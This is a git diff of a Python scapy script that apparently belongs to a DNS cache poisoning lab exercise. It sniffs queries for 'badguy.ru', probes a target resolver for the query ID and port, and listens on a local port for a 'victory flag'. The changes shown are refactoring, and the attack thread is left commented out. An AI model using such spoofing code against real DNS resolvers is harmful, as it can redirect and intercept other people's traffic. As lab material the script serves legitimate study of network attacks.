@@ -6,6 +6,7 @@ This script makes
 
 """
 
+import sys
 import threading
 import time
 from socket import *
@@ -33,6 +34,15 @@ BITE_THE_RAT_HEADER = "BITE_THE_RAT: "
 LISTENER_HEADER = "LISTENER_FLAG: "
 
 
+# get current time in milliseconds
+def current_milli_time():
+    """
+    Calculate time milliseconds and return an int value
+
+    """
+    return int(round(time.time() * 1000))
+
+
 def dns_server_routine():
     print(DNS_ROUTINE_HEADER + "Starting DNS server of badguy.ru routine")
     while True:
@@ -40,7 +50,7 @@ def dns_server_routine():
         if not a[0].haslayer(DNS) or a[0].qr:
             continue
 
-        print(DNS_ROUTINE_HEADER + "I've catched a packet")
+        print(DNS_ROUTINE_HEADER + "DNS packet sniffed, analyzing..")
         sniffed_packet = a[0]
         sniffed_ip = sniffed_packet.getlayer(IP)
         sniffed_dns = sniffed_packet.getlayer(DNS)
@@ -63,15 +73,7 @@ def dns_server_routine():
         bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat, args=target_port)
         # uncomment to attack
         # bite_rat_thread.start()
-
-
-# get current time in milliseconds
-def current_milli_time():
-    """
-    Calculate time milliseconds and return an int value
-
-    """
-    return int(round(time.time() * 1000))
+        break
 
 
 def bite_the_rat(target_port_sniffed):
@@ -104,12 +106,12 @@ def bite_the_rat(target_port_sniffed):
 
 UDP_IP = "192.168.56.1"
 UDP_PORT = 1337
-BUFFER_SIZE = 1024
+BUFFER_SIZE = 2048
 
 
 def flag_victory_listener():
     """
-    This script listens on port 1337 the Victory flag.
+    This function listens on port 1337 the Victory flag.
 
     """
     sock = socket(AF_INET,  # Internet
@@ -125,7 +127,7 @@ def flag_victory_listener():
         print(LISTENER_HEADER + "Closing socket to exit gracefully...")
         sock.close()
         print(LISTENER_HEADER + "Socket close, bye bye!")
-        exit(0)
+        sys.exit(0)
 
 
 def main():
@@ -133,23 +135,21 @@ def main():
     dns_badguy_thread = threading.Thread(name="dns_badguy_thread", target=dns_server_routine)
     flag_victory_thread = threading.Thread(name="flag_victory_thread", target=flag_victory_listener)
     print("Threads created!")
-    print("Starting listener to get victory flag")
-    flag_victory_thread.start()
     print("Starting DNS of badguy to get port and initial query id")
     dns_badguy_thread.start()
+    print("Starting listener to get victory flag")
+    flag_victory_thread.start()
 
     # point 1: send a dns request for badguy.ru
-    print(
-        "Sending first request to " + TARGET_IP + "asking for badguy.ru to get an initial queryid and port with our "
-                                                  "DNS")
+    print("Sending first request to " + TARGET_IP +
+          " asking for badguy.ru to get an initial queryId and port with our DNS")
     first_dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1,  # recursion desired
                                                                              qd=DNSQR(qname=DNS_URL_BADGUY))
 
     send(first_dns_req, verbose=0)
 
-
-#    flag_victory_thread.join()
-#    dns_badguy_thread.join()
+    # flag_victory_thread.join()
+    # dns_badguy_thread.join()
 
 
 if __name__ == "__main__":
